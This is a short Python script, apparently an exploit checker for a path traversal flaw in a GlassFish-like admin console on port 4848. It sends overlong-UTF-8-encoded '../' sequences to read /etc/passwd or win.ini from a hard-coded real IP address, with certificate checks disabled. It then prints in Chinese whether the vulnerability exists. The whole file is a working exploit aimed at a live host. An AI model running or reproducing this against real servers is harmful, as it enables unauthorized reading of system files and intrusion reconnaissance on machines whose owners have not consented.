import requests

url ='https://39.105.206.80:4848'
payload_linux = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
payload_windos = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
data_linux = requests.get(url+payload_linux,verify=False)#请求源代码##ssl错误请求加免验证
data_windows = requests.get(url+payload_windos,verify=False)#请求源代码

#print(data_linux.content.decode('utf-8'))
#print(data_windows.content.decode('utf-8'))
data_linux = requests.get(url+payload_linux,verify=False).status_code#请求状态码
data_windows = requests.get(url+payload_windos,verify=False).status_code#请求状态码
#print(data_linux)
#print(data_windows)
if data_linux == 200 or data_windows == 200:
    print("漏洞存在")
else:
    print("漏洞不存在")

